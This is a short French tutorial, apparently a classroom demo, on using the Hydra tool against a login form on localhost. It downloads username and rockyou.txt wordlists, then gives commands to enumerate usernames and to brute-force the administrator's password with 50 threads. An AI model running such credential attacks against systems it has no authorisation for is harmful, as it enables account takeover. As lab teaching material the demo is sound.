# Démo Hydra

---

## Config

```bash
sudo apt update
sudo apt install hydra
```

Commence par télécharger un fichier des username les plus répandus

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt
```

La commande hydra pour trouver le bon username

`-s` PORT si le service est sur un port différent, précisez le port avec l'option `-s`.

> port 8080

```bash
hydra -L top-usernames-shortlist.txt -p toto localhost -s:8080 http-post-form "/index.php:username=^USER^&password=^PASS^:F=Lo
gin invalide."
```

```bash
hydra -L top-usernames-shortlist.txt -p toto localhost http-post-form "/index.php:username=^USER^&password=^PASS^:F=Login invalide."

```

On trouve `user` et `administrator`, on va trouver leur mot de passe, on télécharge un fichier qui s'appelle rockyou.txt et qui contient 16 millions de mot de passe.

```bash
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

Commande pour cracker le MDP de administrator :

```bash
hydra -l administrator -P rockyou.txt localhost http-post-form "/index.php:username=^USER^&password=^PASS^:F=Mot de passe invalide."
```

```bash
hydra -l administrator -P rockyou.txt localhost http-post-form "/index.php:username=^USER^&password=^PASS^:F=Mot de passe invalide." -t 50
```

On peut ajoute l'option `-V` afin de voir quel username ou password sont utilisés.

L'option `-t 50` permet d'exécuter 50 threads pour améliorer les perfs du brute force.
